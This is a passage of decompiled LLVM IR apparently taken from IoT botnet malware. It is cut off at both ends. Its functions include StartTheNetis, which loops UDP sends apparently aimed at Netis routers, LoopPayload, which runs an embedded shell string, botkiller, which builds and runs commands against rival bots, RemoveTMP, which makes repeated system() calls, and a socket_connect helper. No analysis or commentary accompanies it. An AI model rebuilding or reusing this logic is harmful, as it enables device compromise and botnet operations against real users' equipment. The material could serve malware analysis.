  %v3_804e0d4 = inttoptr i32 %v2_804e0d4 to i32*
  store i32 %v0_804e0c1, i32* %v3_804e0d4, align 4
  %v0_804e0d8 = load i32, i32* @esp, align 4
  %v1_804e0d8 = add i32 %v0_804e0d8, 4
  %v2_804e0d8 = inttoptr i32 %v1_804e0d8 to i32*
  store i32 ptrtoint ([16 x i8]* @global_var_8059d58.253 to i32), i32* %v2_804e0d8, align 4
  %v0_804e0e0 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e0e0 = load i32, i32* @esp, align 4
  %v2_804e0e0 = inttoptr i32 %v1_804e0e0 to i32*
  store i32 %v0_804e0e0, i32* %v2_804e0e0, align 4
  %v2_804e0e3 = call i32 @HackerPrint(i32 %stack_var_-628.242, i32 %stack_var_-624.241)
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  store i8 7, i8* %v4_804d1cb, align 4
  br label %dec_label_pc_804e319

dec_label_pc_804e108:                             ; preds = %dec_label_pc_804df62
  store i8 0, i8* %v4_804d1cb, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804e139 = add i32 %v2_804d127, %v2_804d17b
  %v4_804e139 = inttoptr i32 %v3_804e139 to i8*
  store i8 1, i8* %v4_804e139, align 1
  br label %dec_label_pc_804e319

dec_label_pc_804e143:                             ; preds = %dec_label_pc_804de8b
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v1_804d17f, i32* %eax.global-to-local, align 4
  %v2_804e15e = load i32, i32* %v1_804d182, align 4
  store i32 %v2_804e15e, i32* %eax.global-to-local, align 4
  %v1_804e160 = add i32 %v2_804e15e, 7
  store i32 %v1_804e160, i32* @ebx, align 4
  %v0_804e163 = load i32, i32* @esp, align 4
  %v1_804e163 = inttoptr i32 %v0_804e163 to i32*
  store i32 0, i32* %v1_804e163, align 4
  %v1_804e16a = inttoptr i32 %stack_var_-628.242 to i32*
  %v2_804e16a = call i32 @__GI_time(i32* %v1_804e16a)
  store i32 %v2_804e16a, i32* %eax.global-to-local, align 4
  %v0_804e16f = load i32, i32* @ebx, align 4
  %v7_804e16f = icmp ult i32 %v0_804e16f, %v2_804e16a
  %v1_804e171 = icmp eq i1 %v7_804e16f, false
  br i1 %v1_804e171, label %dec_label_pc_804e319, label %dec_label_pc_804e177

dec_label_pc_804e177:                             ; preds = %dec_label_pc_804e143
  store i8 0, i8* %v4_804d1cb, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804e1a8 = add i32 %v2_804d127, %v2_804d17b
  %v4_804e1a8 = inttoptr i32 %v3_804e1a8 to i8*
  store i8 1, i8* %v4_804e1a8, align 1
  br label %dec_label_pc_804e319

dec_label_pc_804e1b2:                             ; preds = %dec_label_pc_804d1b5
  store i32 %storemerge43, i32* @ebx, align 4
  %v0_804e1b5 = load i32, i32* @esp, align 4
  %v1_804e1b5 = inttoptr i32 %v0_804e1b5 to i32*
  store i32 0, i32* %v1_804e1b5, align 4
  %v1_804e1bc = inttoptr i32 %v6_804d1cb to i32*
  %v2_804e1bc = call i32 @__GI_time(i32* %v1_804e1bc)
  %v0_804e1c6 = load i32, i32* @ebx, align 4
  %v1_804e1c8 = mul i32 %v0_804e1c6, 4
  store i32 %v1_804e1c8, i32* %edx.global-to-local, align 4
  %v2_804e1d6 = mul i32 %v0_804e1c6, 28
  %v2_804e1d8 = add i32 %v2_804e1d6, %v2_804d09e
  %v1_804e1da = add i32 %v2_804e1d8, 16
  %v2_804e1dd = inttoptr i32 %v1_804e1da to i32*
  store i32 %v2_804e1bc, i32* %v2_804e1dd, align 4
  %v0_804e1df = load i32, i32* bitcast ([703 x i8]** @global_var_805f118.255 to i32*), align 8
  %v5_804e1e9 = inttoptr i32 %v0_804e1df to i8*
  %v1_804e1ef = and i32 %v0_804e1df, -256
  store i32 %v1_804e1ef, i32* %eax.global-to-local, align 4
  store i32 %v0_804e1df, i32* @edi, align 4
  %v3_804e1f8 = call i32 @_strlen(i8* %v5_804e1e9)
  store i32 %v3_804e1f8, i32* @ebx, align 4
  %v0_804e201 = load i32, i32* bitcast ([703 x i8]** @global_var_805f118.255 to i32*), align 8
  store i32 %v0_804e201, i32* @esi, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804e21d = inttoptr i32 %v2_804d17d to i32*
  %v4_804e21d = load i32, i32* %v3_804e21d, align 4
  store i32 %v4_804e21d, i32* %eax.global-to-local, align 4
  %v0_804e220 = load i32, i32* @esp, align 4
  %v1_804e220 = add i32 %v0_804e220, 12
  %v2_804e220 = inttoptr i32 %v1_804e220 to i32*
  store i32 16384, i32* %v2_804e220, align 4
  %v0_804e228 = load i32, i32* @ebx, align 4
  %v1_804e228 = load i32, i32* @esp, align 4
  %v2_804e228 = add i32 %v1_804e228, 8
  %v3_804e228 = inttoptr i32 %v2_804e228 to i32*
  store i32 %v0_804e228, i32* %v3_804e228, align 4
  %v0_804e22c = load i32, i32* @esi, align 4
  %v1_804e22c = load i32, i32* @esp, align 4
  %v2_804e22c = add i32 %v1_804e22c, 4
  %v3_804e22c = inttoptr i32 %v2_804e22c to i32*
  store i32 %v0_804e22c, i32* %v3_804e22c, align 4
  %v0_804e230 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e230 = load i32, i32* @esp, align 4
  %v2_804e230 = inttoptr i32 %v1_804e230 to i32*
  store i32 %v0_804e230, i32* %v2_804e230, align 4
  %v5_804e233 = call i32 @__libc_send(i32 %v0_804e1df, i32 %stack_var_-628.242, i32 %stack_var_-624.241, i32 %v2_804d09e)
  %v2_804e238 = icmp slt i32 %v5_804e233, 0
  %v1_804e23a = icmp eq i1 %v2_804e238, false
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  br i1 %v1_804e23a, label %dec_label_pc_804e298, label %dec_label_pc_804e23c

dec_label_pc_804e23c:                             ; preds = %dec_label_pc_804e1b2
  %v4_804e252 = load i32, i32* %v3_804e21d, align 4
  store i32 %v4_804e252, i32* %eax.global-to-local, align 4
  %v1_804e255 = load i32, i32* @esp, align 4
  %v2_804e255 = inttoptr i32 %v1_804e255 to i32*
  store i32 %v4_804e252, i32* %v2_804e255, align 4
  %v2_804e258 = call i32 @sclose(i32 %v0_804e1df)
  store i8 0, i8* %v4_804d1cb, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  %v3_804e28e = add i32 %v2_804d127, %v2_804d17b
  %v4_804e28e = inttoptr i32 %v3_804e28e to i8*
  store i8 1, i8* %v4_804e28e, align 1
  br label %dec_label_pc_804e319

dec_label_pc_804e298:                             ; preds = %dec_label_pc_804e1b2
  %v3_804e2ae = add i32 %v2_804d127, %v2_804d17b
  %v4_804e2ae = inttoptr i32 %v3_804e2ae to i8*
  store i8 3, i8* %v4_804e2ae, align 1
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v1_804d17f, i32* %eax.global-to-local, align 4
  %v2_804e2ce = load i32, i32* %v1_804d182, align 4
  store i32 %v2_804e2ce, i32* %eax.global-to-local, align 4
  %v1_804e2d0 = add i32 %v2_804e2ce, 60
  store i32 %v1_804e2d0, i32* @ebx, align 4
  %v0_804e2d3 = load i32, i32* @esp, align 4
  %v1_804e2d3 = inttoptr i32 %v0_804e2d3 to i32*
  store i32 0, i32* %v1_804e2d3, align 4
  %tmp39 = inttoptr i32 %v0_804e1df to i32*
  %v3_804e2da = call i32 @__GI_time(i32* %tmp39)
  store i32 %v3_804e2da, i32* %eax.global-to-local, align 4
  %v0_804e2df = load i32, i32* @ebx, align 4
  %v7_804e2df = icmp ult i32 %v0_804e2df, %v3_804e2da
  %v1_804e2e1 = icmp eq i1 %v7_804e2df, false
  br i1 %v1_804e2e1, label %dec_label_pc_804e319, label %dec_label_pc_804e2e3

dec_label_pc_804e2e3:                             ; preds = %dec_label_pc_804e298
  store i8 0, i8* %v4_804d1cb, align 4
  store i32 %v1_804d16d, i32* %edx.global-to-local, align 4
  store i32 %v2_804d17b, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804e2ae, align 1
  br label %dec_label_pc_804e319

dec_label_pc_804e319:                             ; preds = %dec_label_pc_804d1b5, %dec_label_pc_804e298, %dec_label_pc_804e143, %dec_label_pc_804dcad, %dec_label_pc_804da09, %dec_label_pc_804d8b3, %dec_label_pc_804d3f0, %dec_label_pc_804e23c, %dec_label_pc_804e177, %dec_label_pc_804e108, %dec_label_pc_804dfce, %dec_label_pc_804dfae, %dec_label_pc_804df42, %dec_label_pc_804de6b, %dec_label_pc_804de30, %dec_label_pc_804ddb8, %dec_label_pc_804dce1, %dec_label_pc_804dc8d, %dec_label_pc_804dc6d, %dec_label_pc_804dbc7, %dec_label_pc_804db8c, %dec_label_pc_804db14, %dec_label_pc_804da3d, %dec_label_pc_804d9e9, %dec_label_pc_804d9c9, %dec_label_pc_804d8e7, %dec_label_pc_804d857, %dec_label_pc_804d751, %dec_label_pc_804d6f5, %dec_label_pc_804d58e, %dec_label_pc_804d54d, %dec_label_pc_804d3d0, %dec_label_pc_804d391, %dec_label_pc_804e2e3
  %stack_var_-624.1 = phi i32 [ %stack_var_-624.241, %dec_label_pc_804d1b5 ], [ %stack_var_-624.241, %dec_label_pc_804e298 ], [ %stack_var_-624.241, %dec_label_pc_804e2e3 ], [ %stack_var_-624.241, %dec_label_pc_804e23c ], [ %stack_var_-624.241, %dec_label_pc_804e143 ], [ %stack_var_-624.241, %dec_label_pc_804e177 ], [ %stack_var_-624.241, %dec_label_pc_804e108 ], [ %stack_var_-624.241, %dec_label_pc_804dfce ], [ %stack_var_-624.241, %dec_label_pc_804dfae ], [ %stack_var_-624.241, %dec_label_pc_804df42 ], [ %stack_var_-624.241, %dec_label_pc_804de6b ], [ %stack_var_-624.241, %dec_label_pc_804de30 ], [ %stack_var_-624.241, %dec_label_pc_804ddb8 ], [ %stack_var_-624.241, %dec_label_pc_804dcad ], [ %stack_var_-624.241, %dec_label_pc_804dce1 ], [ %stack_var_-624.241, %dec_label_pc_804dc8d ], [ %stack_var_-624.241, %dec_label_pc_804dc6d ], [ %v4_804da96, %dec_label_pc_804dbc7 ], [ %v4_804da96, %dec_label_pc_804db8c ], [ %v4_804da96, %dec_label_pc_804db14 ], [ %stack_var_-624.241, %dec_label_pc_804da09 ], [ %stack_var_-624.241, %dec_label_pc_804da3d ], [ %stack_var_-624.241, %dec_label_pc_804d9e9 ], [ %stack_var_-624.241, %dec_label_pc_804d9c9 ], [ %stack_var_-624.241, %dec_label_pc_804d8b3 ], [ %stack_var_-624.241, %dec_label_pc_804d8e7 ], [ %stack_var_-624.241, %dec_label_pc_804d857 ], [ %stack_var_-624.241, %dec_label_pc_804d751 ], [ %stack_var_-624.241, %dec_label_pc_804d6f5 ], [ %stack_var_-624.241, %dec_label_pc_804d3f0 ], [ %stack_var_-624.241, %dec_label_pc_804d58e ], [ %stack_var_-624.241, %dec_label_pc_804d54d ], [ %stack_var_-624.241, %dec_label_pc_804d3d0 ], [ %stack_var_-624.241, %dec_label_pc_804d391 ]
  %stack_var_-628.1 = phi i32 [ %stack_var_-628.242, %dec_label_pc_804d1b5 ], [ %stack_var_-628.242, %dec_label_pc_804e298 ], [ %stack_var_-628.242, %dec_label_pc_804e2e3 ], [ %stack_var_-628.242, %dec_label_pc_804e23c ], [ %stack_var_-628.242, %dec_label_pc_804e143 ], [ %stack_var_-628.242, %dec_label_pc_804e177 ], [ %stack_var_-628.242, %dec_label_pc_804e108 ], [ %stack_var_-628.242, %dec_label_pc_804dfce ], [ %stack_var_-628.242, %dec_label_pc_804dfae ], [ %stack_var_-628.242, %dec_label_pc_804df42 ], [ %v4_804dd3a, %dec_label_pc_804de6b ], [ %v4_804dd3a, %dec_label_pc_804de30 ], [ %v4_804dd3a, %dec_label_pc_804ddb8 ], [ %stack_var_-628.242, %dec_label_pc_804dcad ], [ %stack_var_-628.242, %dec_label_pc_804dce1 ], [ %stack_var_-628.242, %dec_label_pc_804dc8d ], [ %stack_var_-628.242, %dec_label_pc_804dc6d ], [ %stack_var_-628.242, %dec_label_pc_804dbc7 ], [ %stack_var_-628.242, %dec_label_pc_804db8c ], [ %stack_var_-628.242, %dec_label_pc_804db14 ], [ %stack_var_-628.242, %dec_label_pc_804da09 ], [ %stack_var_-628.242, %dec_label_pc_804da3d ], [ %stack_var_-628.242, %dec_label_pc_804d9e9 ], [ %stack_var_-628.242, %dec_label_pc_804d9c9 ], [ %stack_var_-628.242, %dec_label_pc_804d8b3 ], [ %stack_var_-628.242, %dec_label_pc_804d8e7 ], [ %stack_var_-628.242, %dec_label_pc_804d857 ], [ %stack_var_-628.242, %dec_label_pc_804d751 ], [ %stack_var_-628.242, %dec_label_pc_804d6f5 ], [ %stack_var_-628.242, %dec_label_pc_804d3f0 ], [ %stack_var_-628.242, %dec_label_pc_804d58e ], [ %stack_var_-628.242, %dec_label_pc_804d54d ], [ %stack_var_-628.242, %dec_label_pc_804d3d0 ], [ %stack_var_-628.242, %dec_label_pc_804d391 ]
  %v4_804e319 = add nuw nsw i32 %storemerge43, 1
  %v15_804e31f = icmp eq i32 %v4_804e319, 1000
  br i1 %v15_804e31f, label %dec_label_pc_804d15b, label %dec_label_pc_804d167

; uselistorder directives
  uselistorder i32 %v4_804e319, { 1, 0, 2 }
  uselistorder i32 %v0_804d76a, { 1, 0 }
  uselistorder i32 %v5_804d680, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804d61f, { 1, 0 }
  uselistorder i32 %v2_804d603, { 1, 0 }
  uselistorder i32 %v2_804d233, { 1, 0 }
  uselistorder i32 %v6_804d1cb, { 8, 7, 5, 6, 4, 2, 3, 1, 0, 10, 9, 11 }
  uselistorder i8* %v4_804d1cb, { 22, 23, 17, 18, 19, 20, 21, 14, 15, 16, 11, 12, 13, 8, 9, 10, 5, 6, 7, 1, 2, 3, 4, 0, 24 }
  uselistorder i32* %v1_804d182, { 6, 5, 4, 3, 1, 2, 0, 7 }
  uselistorder i32 %v1_804d17f, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v2_804d17d, { 22, 17, 16, 19, 18, 20, 21, 15, 12, 13, 14, 11, 8, 9, 10, 5, 6, 7, 0, 1, 3, 2, 4, 23 }
  uselistorder i32 %v2_804d17b, { 24, 0, 1, 23, 25, 26, 2, 35, 3, 32, 27, 28, 29, 5, 30, 4, 31, 6, 33, 34, 36, 7, 38, 39, 8, 37, 40, 41, 42, 9, 43, 10, 45, 44, 46, 11, 48, 49, 12, 47, 50, 51, 52, 13, 53, 14, 55, 54, 56, 15, 63, 64, 16, 62, 65, 58, 59, 17, 57, 60, 61, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 19, 78, 18, 79, 80, 20, 81, 21, 82, 22 }
  uselistorder i32 %v1_804d16d, { 1, 2, 0, 3, 4, 16, 17, 12, 5, 6, 7, 8, 9, 10, 11, 13, 14, 15, 18, 19, 21, 22, 20, 23, 24, 25, 26, 28, 27, 29, 30, 31, 33, 34, 32, 35, 36, 37, 38, 40, 39, 41, 42, 43, 51, 52, 50, 53, 45, 46, 47, 44, 48, 49, 54, 55, 56, 59, 57, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73 }
  uselistorder i32 %stack_var_-624.241, { 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 17, 16, 15, 12, 11, 10, 7, 6, 5, 4, 3, 2, 0, 1, 9, 8, 14, 13, 18 }
  uselistorder i32 %stack_var_-628.242, { 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 9, 7, 6, 4, 3, 2, 0, 1, 5, 11, 10, 8 }
  uselistorder i32 %storemerge43, { 2, 3, 4, 5, 6, 8, 7, 0, 1 }
  uselistorder i32 %v4_804d14c, { 1, 0, 2 }
  uselistorder i32 %storemerge245, { 1, 0 }
  uselistorder i32 %v2_804d127, { 1, 0, 4, 3, 2, 6, 5, 7, 9, 8, 10, 13, 12, 11, 14, 15 }
  uselistorder i32 %v2_804d09e, { 12, 4, 14, 13, 16, 15, 5, 6, 7, 8, 17, 0, 1, 2, 9, 3, 10, 11 }
  uselistorder i32* %stack_var_-608, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-600, { 3, 1, 0, 2, 4, 5, 6 }
  uselistorder i32* %stack_var_-320, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-328, { 0, 2, 3, 4, 1, 5, 6 }
  uselistorder i32* %stack_var_-336, { 1, 5, 0, 2, 3, 6, 7, 4, 8, 9 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 10, 12, 13, 11, 14, 15, 17, 18, 16, 19, 20, 9, 21, 22, 23, 24, 26, 25, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 54, 53, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 84, 85, 86, 87, 88, 89, 90, 91, 92, 83, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106 }
  uselistorder i32* %eax.global-to-local, { 1, 4, 2, 3, 6, 7, 5, 8, 9, 10, 11, 12, 15, 13, 14, 16, 18, 20, 19, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 17, 31, 32, 33, 34, 35, 37, 36, 38, 39, 41, 40, 42, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 57, 55, 56, 59, 60, 61, 58, 62, 63, 64, 66, 65, 67, 68, 70, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 82, 80, 81, 84, 85, 86, 83, 87, 88, 89, 90, 91, 92, 95, 93, 94, 97, 98, 96, 99, 100, 101, 102, 103, 104, 105, 108, 106, 107, 109, 110, 112, 111, 113, 114, 115, 116, 118, 117, 119, 120, 121, 122, 123, 126, 124, 125, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 145, 160, 161, 162, 163, 164, 165, 166, 0, 179, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 186, 180, 181, 182, 183, 185, 184 }
  uselistorder i32 ()* @get_telstate_host, { 1, 0 }
  uselistorder i32 ()* @contains_fail, { 2, 1, 0 }
  uselistorder i32 (i32)* @read_until_response, { 2, 1, 0 }
  uselistorder i32 (i32)* @sclose, { 4, 3, 2, 1, 0 }
  uselistorder i8 7, { 1, 2, 0 }
  uselistorder i8 5, { 1, 0 }
  uselistorder i32 5000, { 1, 0 }
  uselistorder label %dec_label_pc_804e319, { 33, 1, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 3, 17, 18, 19, 20, 21, 22, 4, 23, 24, 25, 5, 26, 27, 28, 29, 30, 6, 31, 32, 0 }
  uselistorder label %dec_label_pc_804d1b5, { 1, 0 }
  uselistorder label %dec_label_pc_804d167, { 1, 0 }
  uselistorder label %dec_label_pc_804d0d3, { 1, 0 }
}

define i32 @StartTheNetis() local_unnamed_addr {
entry:
  %stack_var_-1072 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v2_804e37e = ptrtoint i32* %stack_var_-48 to i32
  %v2_804e3a8 = ptrtoint i32* %stack_var_-1072 to i32
  %v4_804e3cd = bitcast i32* %stack_var_-1072 to i8*
  br label %dec_label_pc_804e338

dec_label_pc_804e338:                             ; preds = %dec_label_pc_804e338, %entry
  %v5_804e34f = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 %v5_804e34f, i32* @eax, align 4
  %v1_804e357 = call i32 @NetisRanges(i32 %v5_804e34f)
  store i32 2, i32* %stack_var_-48, align 4
  %v2_804e36c = call i32 @htons(i16 -12123)
  %v3_804e3b1 = call i32 @sprintf(i32 %v2_804e3a8, i32 ptrtoint ([711 x i8]* @global_var_8059d90.257 to i32))
  store i32 %v2_804e37e, i32* @ebx, align 4
  %v3_804e3d3 = call i32 @_strlen(i8* %v4_804e3cd)
  %v8_804e403 = call i32 @__libc_sendto(i32 %v5_804e34f, i32 %v2_804e3a8, i32 %v3_804e3d3, i32 0, i32 %v2_804e37e, i32 16)
  br label %dec_label_pc_804e338
}

define i32 @LoopPayload() local_unnamed_addr {
entry:
  %v2_804e427 = call i32 @__libc_system(i32 ptrtoint ([704 x i8]* @global_var_805a058.258 to i32))
  ret i32 %v2_804e427
}

define i32 @botkiller() local_unnamed_addr {
entry:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-2180 = alloca i32, align 4
  %stack_var_-2308 = alloca i32, align 4
  %stack_var_-2020 = alloca i32, align 4
  %stack_var_-1056 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e43f = load i32, i32* @edi, align 4
  %v0_804e440 = load i32, i32* @esi, align 4
  %v0_804e441 = load i32, i32* @ebx, align 4
  store i32 %v0_804e441, i32* %stack_var_-16, align 4
  %v2_804e448 = ptrtoint i32* %stack_var_-68 to i32
  %tmp23 = bitcast i32* %stack_var_-68 to i8*
  store i32 %v2_804e448, i32* @edi, align 4
  store i32 ptrtoint ([9 x i8*]* @global_var_805ba40.268 to i32), i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_804e458 = call i8* @_memcpy(i8* %tmp23, i8* bitcast ([9 x i8*]* @global_var_805ba40.268 to i8*), i32 10)
  %v5_804e475 = bitcast i32* %stack_var_-1056 to i16*
  %v6_804e475 = call i32 @memcpy(i16* %v5_804e475, i32 ptrtoint ([247 x i8*]* @global_var_805b600.509 to i32), i32 988)
  %v5_804e495 = bitcast i32* %stack_var_-2020 to i16*
  %v6_804e495 = call i32 @memcpy(i16* %v5_804e495, i32 ptrtoint ([241 x i8*]* @global_var_805ab20.736 to i32), i32 964)
  %v5_804e4a7 = icmp sgt i32 %tmp8, 0
  br i1 %v5_804e4a7, label %dec_label_pc_804e4ad, label %dec_label_pc_804e5af

dec_label_pc_804e4ad:                             ; preds = %entry
  %v2_804e4ad = ptrtoint i32* %stack_var_-2308 to i32
  %v5_804e4c9 = bitcast i32* %stack_var_-2308 to i8*
  %v6_804e4c9 = call i32 @__GI_memset(i8* %v5_804e4c9, i32 0, i32 128)
  %v0_804e531 = load i32, i32* @ebp, align 4
  %v4_804e4e1 = add i32 %v0_804e531, -64
  %v5_804e4e1 = inttoptr i32 %v4_804e4e1 to i32*
  %v6_804e4e8 = load i32, i32* %v5_804e4e1, align 4
  store i32 %v6_804e4e8, i32* @ebx, align 4
  %v6_804e4ef = load i32, i32* %v5_804e4e1, align 4
  store i32 %v6_804e4ef, i32* @esi, align 4
  %v6_804e4f6 = load i32, i32* %v5_804e4e1, align 4
  %v8_804e527 = call i32 @__GI_snprintf(i32 %v2_804e4ad, i32 127, i32 ptrtoint ([100 x i8]* @global_var_805ba68.737 to i32), i32 %v6_804e4f6, i32 %v6_804e4ef, i32 %v6_804e4e8)
  %v1_804e576 = call i32 @__libc_system(i32 %v2_804e4ad)
  %v2_804e591 = ptrtoint i32* %stack_var_-2180 to i32
  %v3_804e59a = call i32 @sprintf(i32 %v2_804e591, i32 ptrtoint ([14 x i8]* @global_var_805bae9.739 to i32))
  %v1_804e5a8 = call i32 @__libc_system(i32 %v2_804e591)
  br label %dec_label_pc_804e5bb

dec_label_pc_804e5af:                             ; preds = %entry
  %v1_804e5b6 = call i32 @sleep(i32 5)
  br label %dec_label_pc_804e5bb

dec_label_pc_804e5bb:                             ; preds = %dec_label_pc_804e4ad, %dec_label_pc_804e5af
  %storemerge3 = phi i32 [ %v1_804e5b6, %dec_label_pc_804e5af ], [ %v1_804e5a8, %dec_label_pc_804e4ad ]
  %v2_804e5c1 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e5c1, i32* @ebx, align 4
  store i32 %v0_804e440, i32* @esi, align 4
  store i32 %v0_804e43f, i32* @edi, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32* %v5_804e4e1, { 0, 2, 1 }
  uselistorder i32 %v2_804e4ad, { 1, 0 }
  uselistorder label %dec_label_pc_804e5bb, { 1, 0 }
}

define i32 @RemoveTMP() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804e5c6 = load i32, i32* @ebp, align 4
  store i32 %v0_804e5c6, i32* %stack_var_-4, align 4
  %v2_804e5d3 = call i32 @__libc_system(i32 ptrtoint ([43 x i8]* @global_var_805baf8.740 to i32))
  %v2_804e5df = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_805bb23.741 to i32))
  %v2_804e5eb = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_805bb38.742 to i32))
  %v2_804e5f7 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_805bb23.741 to i32))
  %v2_804e603 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_805bb4e.743 to i32))
  %v2_804e60f = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_805bb5c.744 to i32))
  %v2_804e61b = call i32 @__libc_system(i32 ptrtoint ([23 x i8]* @global_var_805bb67.745 to i32))
  %v2_804e627 = call i32 @__libc_system(i32 ptrtoint ([20 x i8]* @global_var_805bb7e.746 to i32))
  %v2_804e633 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_805bb92.747 to i32))
  %v2_804e63f = call i32 @__libc_system(i32 ptrtoint ([17 x i8]* @global_var_805bb9d.748 to i32))
  %v2_804e64b = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_805bbae.749 to i32))
  %v2_804e657 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_805bbbc.750 to i32))
  %v2_804e663 = call i32 @__libc_system(i32 ptrtoint ([36 x i8]* @global_var_805bbd4.751 to i32))
  %v2_804e668 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e668, i32* @ebp, align 4
  ret i32 %v2_804e663

; uselistorder directives
  uselistorder i32 (i32)* @__libc_system, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e66a = load i32, i32* @ebp, align 4
  store i32 %v0_804e66a, i32* %stack_var_-4, align 4
  %v4_804e66a = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804e66a, i32* @ebp, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_804e684 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_804e68c = icmp eq i32 %v1_804e684, 0
  %v1_804e690 = icmp eq i1 %v4_804e68c, false
  br i1 %v1_804e690, label %dec_label_pc_804e69e, label %dec_label_pc_804e763

dec_label_pc_804e69e:                             ; preds = %entry
  %v1_804e6a1 = add i32 %v1_804e684, 12
  %v2_804e6a1 = inttoptr i32 %v1_804e6a1 to i32*
  %v3_804e6a1 = load i32, i32* %v2_804e6a1, align 4
  %v1_804e6a9 = add i32 %v1_804e684, 16
  %v2_804e6a9 = inttoptr i32 %v1_804e6a9 to i32*
  %v3_804e6a9 = load i32, i32* %v2_804e6a9, align 4
  %v1_804e6ac = inttoptr i32 %v3_804e6a9 to i32*
  %v2_804e6ac = load i32, i32* %v1_804e6ac, align 4
  %v15_804e6b5 = ptrtoint i32* %stack_var_-24 to i32
  %v3_804e6bf = call i32 @bcopy(i32 %v2_804e6ac, i32 %v15_804e6b5, i32 %v3_804e6a1)
  %v2_804e6cb = call i32 @htons(i16 %arg2)
  store i32 2, i32* %stack_var_-28, align 4
  %v3_804e6f4 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_804e6fc = ptrtoint i32* %stack_var_-32 to i32
  %v5_804e721 = call i32 @__GI_setsockopt(i32 %v3_804e6f4, i32 6, i32 1, i32 %v2_804e6fc, i32 4)
  %v13_804e726 = icmp eq i32 %v3_804e6f4, -1
  %v1_804e72a = icmp eq i1 %v13_804e726, false
  br i1 %v1_804e72a, label %dec_label_pc_804e735, label %dec_label_pc_804e763

dec_label_pc_804e735:                             ; preds = %dec_label_pc_804e69e
  %v2_804e6b2 = ptrtoint i32* %stack_var_-28 to i32
  %v3_804e74a = call i32 @__libc_connect(i32 %v3_804e6f4, i32 %v2_804e6b2, i32 16)
  %v10_804e74f = icmp eq i32 %v3_804e74a, -1
  %v1_804e752 = icmp eq i1 %v10_804e74f, false
  br i1 %v1_804e752, label %dec_label_pc_804e75d, label %dec_label_pc_804e763

dec_label_pc_804e75d:                             ; preds = %dec_label_pc_804e735
  br label %dec_label_pc_804e763

dec_label_pc_804e763:                             ; preds = %dec_label_pc_804e735, %dec_label_pc_804e69e, %entry, %dec_label_pc_804e75d
